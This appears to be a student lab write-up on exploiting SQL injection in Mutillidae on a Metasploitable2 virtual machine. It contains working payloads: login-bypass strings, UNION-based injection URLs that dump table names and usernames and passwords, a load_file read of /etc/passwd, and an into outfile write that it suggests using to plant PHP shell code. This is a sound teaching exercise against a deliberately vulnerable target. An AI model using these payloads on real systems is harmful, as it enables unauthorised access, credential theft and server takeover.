# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/d46a83b9-e6a4-42c0-901e-33718ac8bff3)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 

![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/2562da15-f593-4189-8727-6ce6c48cc1c6)


![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/f017ba4b-7038-4e59-a84e-a8a524d2c204)

![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/a4d5f2b4-f27d-49bb-8bac-f74ff94b461e)


  ![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/5c458e1e-8ce3-4062-8168-be6ce44c39f2)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.




![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/008c5a96-fa17-4aa1-90dc-1aa6a1c8e37f)

Click “Login”. The logged in page will show as below: 

![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/200652f9-15d4-4a16-93de-86d7c16c6dc6)


##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.



![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/ea2809b1-55f7-487b-b7a1-549c1079d2c5)

Click the login button and you will see it enter into the administrator page.


![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/e5d0a5c2-233d-4ce1-b7bf-de15b23b4bb7)

## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”


After logging out, Now choose the menu as shown below:


![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/5c8fd05a-3dea-410d-8593-58aa979a8337)

![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/088dd41b-b0bf-4c73-a9b9-298bfec010be)

![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/f433df5a-03c7-45e4-bc06-a0b146e4e60b)

![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/af06b099-d7c3-4a7b-85ff-fa8c850bd79c)

![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/4f8c09cd-7076-44d7-86e7-a3fd3513ba71)

![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/b0be1740-9067-4e26-b553-9d3da6daa965)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.



![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/6951db2d-7697-4e42-ba73-e13a5a0b0d10)




Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details



Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/438dff70-2e07-4a2b-90e4-d17b1e36ae53)

  After adding the order by 6 into the existing url , the following error statement will be obtained:

  
  When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.



![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/c52069cf-8602-4336-a9c6-6b4ed08b7163)



![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/03e2bb70-2f5e-4b3e-9e58-7393dd9b3935)



Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)


![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/96a344ee-5919-4112-a0bb-ebc60dac4afb)


![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/c77fa6c6-f81d-491d-a2ee-d5159a7a84fe)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details



![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/8fd959a7-61be-466d-a3b1-dd015fa4d152)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details



  ![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/1e797cf6-207a-4f85-b72f-c9c6fb21622f)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.



![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/7e181bcf-f579-4ef8-bc4b-2a6a5457ef31)



The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details



![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/76e4dda6-bae5-4ba8-bf75-afcf18d756f0)



Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/62e42f95-9fe4-4f4e-aa3a-a7f174bbbf99)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details




![image](https://github.com/NARESHVB/sqlinjection/assets/119393642/ad498f3b-029a-44c3-8576-59616094d17f)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
